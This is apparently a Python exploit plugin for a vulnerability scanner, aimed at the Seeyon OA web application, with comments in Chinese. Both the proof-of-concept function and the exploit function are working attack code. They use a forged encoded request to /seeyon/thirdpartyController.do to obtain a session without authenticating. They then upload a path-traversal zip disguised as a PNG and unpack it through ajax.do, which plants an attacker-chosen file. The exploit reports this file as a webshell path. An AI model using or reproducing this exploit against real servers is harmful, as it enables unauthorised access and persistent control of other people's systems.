# -*- coding: UTF-8 -*-
#!/usr/bin/python
import string
import requests
import os
import zipfile
import random
import re
import time
def vuln_info():
    info={
        'vuln_name': 'session任意文件上传漏洞',  #漏洞名称
        'vuln_referer':'未知',  #漏洞来源
        'vuln_author':'未知',  #插件作者
        'cms_name':'test',#cms_name需要和上级目录保持一致。扫描器自动添加会调用。GUI版本不会调用
        'vuln_description':'''漏洞描述''',
        'vuln_identifier':'''漏洞编号。''',
        'vuln_class':'漏洞分类',#如：信息泄漏、远程命令执行、任意文件上传、SQL注入、XML注入、任意文件读取、本地文件包含、认证绕过/未认证、弱口令、目录遍历、其他、反序列化漏洞、OGNL表达式注入、SSRF、后门、任意文件下载、鉴权绕过、暴力破解、命令注入、路径泄露、XSS、远程文件包含、CSRF、任意文件包含、代码注入、任意文件写入、密码硬编码、文件包含、任意用户注册、缓冲区溢出、用户枚举漏洞、任意文件删除、任意页面上传、管理权限等
        'vuln_solution':'''修复建议。''',
        'FofaQuery_type':'socket', #socket、httpx
        'FofaQuery_link':'/', #此处的路径会加在url拼接访问，进行FofaQuery的条件匹配 此处为all为全部页面都检测
        'FofaQuery_rule':'title="百度"',#header="JSESSIONID" || body="Struts Problem Report" || body="There is no Action mapped for namespace" || body="No result defined for action and result input" || header="Servlet" || header="JBoss",port="60001"
        #header', 'body', 'title', 'banner','port','banner','service','protocol','server'
        'ispoc':1, #是否有poc  1为有 0为无
        'isexp':1  #是否有exp   1为有 0为无
    }
    return info



def check_file():
    path = os.getcwd()
    file_path = os.path.join(path,"payload.zip")
    if os.path.exists(file_path):
        os.remove(file_path)

def write_zipfile(fname, content):
    with zipfile.ZipFile('payload.zip', mode='a', compression=zipfile.ZIP_DEFLATED, ) as zf:
        zf.writestr(fname, content)

def rand_str(num):
    ran_str = ''.join(random.sample(string.ascii_letters + string.digits, num))
    return ran_str

def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
        result = {"Result":False,"Result_Info":"payload"}
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1",
            "Content-Type": "application/x-www-form-urlencoded"}
        data = "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
        req1 = requests.post(url+'/seeyon/thirdpartyController.do', headers=headers,data=data, verify=False, allow_redirects=False, timeout=5)
        findContent=['a8genius.do','fileurls=fileurls']
        if findContent[0] in req1.text and 'set-cookie' in str(req1.headers).lower() and req1.status_code == 200:
            cookies = req1.cookies
            cookies = requests.utils.dict_from_cookiejar(cookies)
            cookie = cookies['JSESSIONID']
            write_zipfile("..\\2.txt","xiaohei")
            write_zipfile("layout.xml","")
            datestr = time.strftime('%Y-%m-%d')
            result = {"Result":False,"Result_Info":"payload"}
            headers = {'Cookie': "JSESSIONID=%s" % cookie}
            file = open('payload.zip', 'rb')
            files = [('file1', ('11.png', file, 'application/octetstream'))]
            data = {'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver':"false", "type": '0', 'isEncrypt': "0"}
            req1 = requests.post(url+'/seeyon/fileUpload.do?method=processUpload', headers=headers, data=data, files=files,verify=False, allow_redirects=False,timeout=5)
            if req1 and req1.status_code == 200 and 'fileurls=' in req1.text:
                reg = re.findall('fileurls=fileurls\+","\+\'(.+)\'',req1.text,re.I)
                fileid=reg[0]
            headers = {'Cookie': 'JSESSIONID={cookie}'.format(cookie=cookie),'Content-Type': 'application/x-www-form-urlencoded'}
            post = f'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22{datestr}%22%2C%22{fileid}%22%5D'
            requests.post(url+'/seeyon/ajax.do', data=post,headers=headers,timeout=30,verify=False)
            target_url = url + '/seeyon/common/designer/pageLayout/2.txt'
            status = requests.get(target_url,headers=headers,verify=False)
            if status.status_code == 200:
                file.close()
                check_file()
                result['Result'] = True
                result['Result_Info'] = '/seeyon/thirdpartyController.do'
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')

def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:

        result = {"Result":False,"Result_Info":"不存在"}
        if exp_data['type']=='uploadfile':
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1",
                "Content-Type": "application/x-www-form-urlencoded"}
            data = "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
            req1 = requests.post(url+'/seeyon/thirdpartyController.do', headers=headers,data=data, verify=False, allow_redirects=False, timeout=5)
            findContent=['a8genius.do','fileurls=fileurls']
            if findContent[0] in req1.text and 'set-cookie' in str(req1.headers).lower() and req1.status_code == 200:
                cookies = req1.cookies
                cookies = requests.utils.dict_from_cookiejar(cookies)
                cookie = cookies['JSESSIONID']

                fname = exp_data['filename']
                shell = exp_data['filename_contents']
                write_zipfile("..\\" + fname,shell)
                write_zipfile("layout.xml","")
                datestr = time.strftime('%Y-%m-%d')
                result = {"Result":False,"Result_Info":"payload"}
                headers = {'Cookie': "JSESSIONID=%s" % cookie}
                file = open('payload.zip', 'rb')
                files = [('file1', ('11.png', file, 'application/octetstream'))]
                data = {'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver':"false", "type": '0', 'isEncrypt': "0"}
                req1 = requests.post(url+'/seeyon/fileUpload.do?method=processUpload', headers=headers, data=data, files=files,verify=False, allow_redirects=False,timeout=5)
                if req1 and req1.status_code == 200 and 'fileurls=' in req1.text:
                        reg = re.findall('fileurls=fileurls\+","\+\'(.+)\'',req1.text,re.I)
                        fileid=reg[0]
                        file.close()
                        check_file()
                headers = {'Cookie': 'JSESSIONID={cookie}'.format(cookie=cookie),'Content-Type': 'application/x-www-form-urlencoded'}
                post = f'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22{datestr}%22%2C%22{fileid}%22%5D'
                requests.post(url+'/seeyon/ajax.do', data=post,headers=headers,timeout=30,verify=False)
                target_url = url + '/seeyon/common/designer/pageLayout/'+fname+''
                status = requests.get(target_url,headers=headers,verify=False)
                if status.status_code == 200:
                    file.close()
                    check_file()
                    result['Result'] = True
                    result['Result_Info'] = 'webshell path: {url}'.format(url=target_url)

        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')
